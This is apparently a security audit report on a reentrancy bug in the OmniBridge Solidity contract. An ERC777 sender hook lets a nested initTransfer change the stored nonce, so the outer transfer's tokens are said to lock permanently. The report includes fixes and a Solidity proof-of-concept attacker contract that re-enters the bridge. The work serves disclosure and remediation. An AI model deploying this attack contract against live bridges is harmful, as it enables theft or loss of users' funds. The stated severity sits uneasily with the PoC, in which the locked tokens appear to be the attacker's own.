### Title
ERC777 `tokensToSend` Hook Enables Nonce Collision in `initTransfer`, Causing Permanent Fund Lock - (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer` increments `currentOriginNonce` at the top of the function but reads the storage variable again — without capturing it in a local variable — when emitting the `InitTransfer` event and when calling `initTransferExtension`. There is no `nonReentrant` guard. An ERC777 token's `tokensToSend` hook fires before the actual token transfer, giving an attacker a reentrant call window. A nested `initTransfer` call increments `currentOriginNonce` a second time; when the outer call resumes, both the Wormhole message and the on-chain event are emitted with the inner call's (higher) nonce. The outer transfer's original nonce is never recorded anywhere, so its locked tokens become permanently unclaimable.

---

### Finding Description

In `OmniBridge.initTransfer`:

```
currentOriginNonce += 1;                          // line 381 — nonce = N+1
...
IERC20(tokenAddress).safeTransferFrom(            // line 407 — ERC777 hook fires HERE
    msg.sender, address(this), amount
);
...
initTransferExtension(
    ..., currentOriginNonce, ...                  // line 418 — reads storage: now N+2
);
emit BridgeTypes.InitTransfer(
    ..., currentOriginNonce, ...                  // line 430 — reads storage: now N+2
);
``` [1](#0-0) [2](#0-1) [3](#0-2) 

`currentOriginNonce` is a `uint64` storage slot, not a stack-local copy. The function has no `nonReentrant` modifier and no `ReentrancyGuard` import anywhere in the EVM source tree. [4](#0-3) 

ERC777 tokens implement ERC20's `transferFrom` interface but additionally call the registered `IERC1820Registry` `tokensToSend` hook on the sender **before** the balance moves. Any user can self-register as their own sender hook implementer — no privileged access required.

In `OmniBridgeWormhole.initTransferExtension`, the `originNonce` parameter (which is `currentOriginNonce` at call time) is Borsh-encoded directly into the Wormhole VAA payload: [5](#0-4) 

So the Wormhole message also carries the wrong nonce.

---

### Impact Explanation

**Critical — Irreversible fund lock.**

Attack trace:

| Step | `currentOriginNonce` | Action |
|------|----------------------|--------|
| Outer `initTransfer` enters | N → **N+1** | Nonce incremented |
| `safeTransferFrom` called on ERC777 token | N+1 | `tokensToSend` hook fires |
| Inner `initTransfer` enters (reentrant) | N+1 → **N+2** | Nonce incremented again |
| Inner call: `initTransferExtension` + `emit InitTransfer` | N+2 | Wormhole VAA + event emitted with nonce **N+2** ✓ |
| Inner call returns; outer `safeTransferFrom` completes | N+2 | Tokens transferred |
| Outer call: `initTransferExtension` + `emit InitTransfer` | N+2 | Wormhole VAA + event emitted with nonce **N+2** ✗ (collision) |

Consequences:
- Nonce **N+1** is never emitted in any event or VAA. The NEAR bridge has no record of it.
- Two VAAs and two events carry nonce **N+2**. The NEAR `finalised_transfers` set accepts the first and rejects the second as a duplicate.
- The outer caller's tokens are locked inside the bridge contract with no redeemable proof. They are permanently unclaimable.

---

### Likelihood Explanation

**Medium.** The attacker must bridge an ERC777 token (e.g., any token built on OpenZeppelin's ERC777 base). ERC777 tokens exist on mainnet (e.g., historical imBTC, AMP). The attacker only needs to self-register as their own `tokensToSend` implementer via the ERC1820 registry — a fully permissionless, on-chain operation. No privileged role, leaked key, or external dependency compromise is required. The attack is deterministic and repeatable.

---

### Recommendation

1. **Capture the nonce in a local variable** immediately after incrementing it, and use that local variable in all subsequent reads (`initTransferExtension`, `emit`):

```solidity
currentOriginNonce += 1;
uint64 originNonce = currentOriginNonce;   // local snapshot
...
initTransferExtension(..., originNonce, ...);
emit BridgeTypes.InitTransfer(..., originNonce, ...);
```

2. **Add `ReentrancyGuard`** from OpenZeppelin and apply `nonReentrant` to `initTransfer` and `initTransfer1155`. This is the belt-and-suspenders fix that covers any future token callback surface (ERC777, ERC1363, fee-on-transfer hooks, etc.).

3. **Apply the same local-variable pattern to `initTransfer1155`**, which has an identical structure: `currentOriginNonce` is incremented then read again from storage in the event. [6](#0-5)

### Proof of Concept

```solidity
// Attacker contract
contract ERC777Attacker is IERC777Sender {
    IERC1820Registry constant registry =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant TOKENS_SENDER_HASH =
        keccak256("ERC777TokensSender");

    OmniBridge bridge;
    IERC777 erc777Token;
    IERC20  otherToken;
    bool    attacking;

    constructor(address _bridge, address _erc777, address _other) {
        bridge    = OmniBridge(_bridge);
        erc777Token = IERC777(_erc777);
        otherToken  = IERC20(_other);
        // Self-register as ERC777 sender hook — permissionless
        registry.setInterfaceImplementer(
            address(this), TOKENS_SENDER_HASH, address(this)
        );
    }

    // Step 1: trigger outer initTransfer with ERC777 token
    function attack() external {
        erc777Token.approve(address(bridge), type(uint256).max);
        otherToken.approve(address(bridge), type(uint256).max);
        bridge.initTransfer(address(erc777Token), 1e18, 0, 0, "sol:VICTIM", "");
        // After this call:
        //   - outer transfer tokens locked, nonce N+1 never emitted → LOST
        //   - inner transfer nonce N+2 emitted twice → one processed, one rejected
    }

    // Step 2: ERC777 hook fires before outer safeTransferFrom completes
    function tokensToSend(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external override {
        if (!attacking) {
            attacking = true;
            // Inner initTransfer: increments nonce to N+2, emits event N+2
            bridge.initTransfer(address(otherToken), 1e18, 0, 0, "sol:VICTIM", "");
            attacking = false;
        }
        // Outer call resumes: emits event N+2 again — collision
    }
}
```

After execution, the outer caller's `1e18` ERC777 tokens are locked in `OmniBridge` with no corresponding nonce N+1 event or VAA. They cannot be redeemed on any destination chain.
